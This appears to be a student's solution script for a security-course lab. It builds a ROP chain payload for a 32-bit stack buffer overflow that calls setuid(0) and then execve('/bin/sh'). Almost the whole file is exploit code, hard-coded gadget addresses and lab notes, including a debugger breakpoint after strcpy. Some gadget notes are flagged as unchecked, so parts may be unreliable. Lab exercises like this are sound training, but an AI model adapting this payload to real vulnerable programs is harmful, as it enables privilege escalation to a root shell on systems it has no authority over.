from shellcode import shellcode
import sys

# sys.stdout.buffer.write(b'/bin' + b'//sh' + b'A'*(104) + 
#                         0x0806ea89.to_bytes(4, 'little') + b'A'*(4) + 0x08072c6b.to_bytes(4, 'little') # set ebx to 0
#                         )

sys.stdout.buffer.write(b'A'*(112) + # b'/bin/sh' + # b'//sh' +
                        # setuid section
                        0x0806ea89.to_bytes(4, 'little') + # set eax to 0
                        b'A' * 4 +
                        0x08072c6b.to_bytes(4, 'little') + # set ebx to eax (0)

                        0x08095956.to_bytes(4, 'little') + # set eax to 8
                        b'A' * 4 +
                        0x0807fe390807fe390807fe390807fe390807fe390807fe39.to_bytes(24, 'little') + # inc eax to 14
                        0x0807fe390807fe390807fe390807fe390807fe390807fe39.to_bytes(24, 'little') + # inc eax to 20
                        0x0807fe390807fe390807fe39.to_bytes(12, 'little') + # inc eax to 23

                        0x080732cf.to_bytes(4, 'little') + # call int 0x80

                        # execve section - works
                        0x08096740.to_bytes(4, 'little') +  # set eax to 7
                        0x0807fe39.to_bytes(4, 'little') + # inc eax to 8
                        0x0807fe39.to_bytes(4, 'little') + # inc eax to 9
                        0x0807fe39.to_bytes(4, 'little') + # inc eax to 10
                        0x0807fe39.to_bytes(4, 'little') + # inc eax to 11

                        0x080481d1.to_bytes(4, 'little') + # set ebx to address of /bin/sh
                        0xfff6a140.to_bytes(4, 'little') + # address of /bin/sh on stack
                        
                        0x08056485.to_bytes(4, 'little') + # set edx to 0xffffffff
                        0x0805e085.to_bytes(4, 'little') + # inc edx to 0
                        0x0806f13c.to_bytes(4, 'little') + # set ecx to 0xffffffff
                        0x08094141.to_bytes(4, 'little') + # inc ecx to 0

                        0x080732d0.to_bytes(4, 'little') + # call int 0x80
                        '/bin/sh'.encode("utf-8")
                        )


# overwrite the return address on the stack with the address of the first gadget in the chain
# which would trigger the chain and execute the desired sequence of gadgets and functions


"""
instructions from lab:
DONE Set ebx to 0
    0x0806ea89 : xor eax, eax ; pop ebx ; ret (successfully sets eax to 0)
        0x0806ea89.to_bytes(4, 'little')
    0x08072c6b : push eax ; adc al, 0x7c ; and dword ptr [esi + 0x1a], edi ; pop ebx ; ret (successfully sets ebx to eax)
        0x08072c6b.to_bytes(4, 'little')


DONE Set eax to 0x17 = 23
    0x08095956 : mov eax, 8 ; pop edi ; ret
    (b'A' * 4)
    0x0807fe39 : nop ; inc eax ; ret

DONE Call int 0x80 — This is equivalent to setuid (0)
    0x080732cf : nop ; int 0x80 ; ret

DONE Have " /bin/sh" in memory
    located at 0xfff6a0b4 X 
    0xfff6a0ec

DONE Set eax to 0x0b = 11
    pass in what we want to pop right below gadget
    0x08096740 : mov eax, 7 ; ret
    0x0807fe39 : nop ; inc eax ; ret (4 times)

DONE Set ebx to address of " /bin/sh"
    0x080481d1 : pop ebx ; ret
    0xfff6a0b4 X
    0xfff6a0ec

DONE Set ecx and edx to 0
    0x08056485 : mov edx, 0xffffffff ; ret
    0x0805e085 : inc edx ; ret
    0x0806f13c : mov ecx, 0xffffffff ; cmovb eax, ecx ; ret  # need to check if this works
    0x08094141 : inc ecx ; ret



    0x0806ea89 : xor eax, eax ; pop ebx ; ret (sets eax to 0)
    0xfff6a04c
    (b'A' * 4)
    0x080870dc : push eax ; ret
    0x080870dc : push eax ; ret
    0x080729c1 : pop edx ; pop ecx ; pop ebx ; ret
        --> code:
        0x0806ea89.to_bytes(4, 'little') + # set eax to 0
        0x080481d1.to_bytes(4, 'little') + # set ebx to address of /bin/sh
        (b'A' * 4) + 
        0x080870dc.to_bytes(4, 'little') + # push eax
        0x080870dc.to_bytes(4, 'little') + # push eax
        0x080729c1.to_bytes(4, 'little') # pop edx and ecx (set to 0)


DONE Call int 0x80 - This is equivalent to execve ("/bin/sh", 0, 0)
    0x080732d0 : int 0x80 ; ret

instructions:
break *0x08048c17 for right after strcpy

"""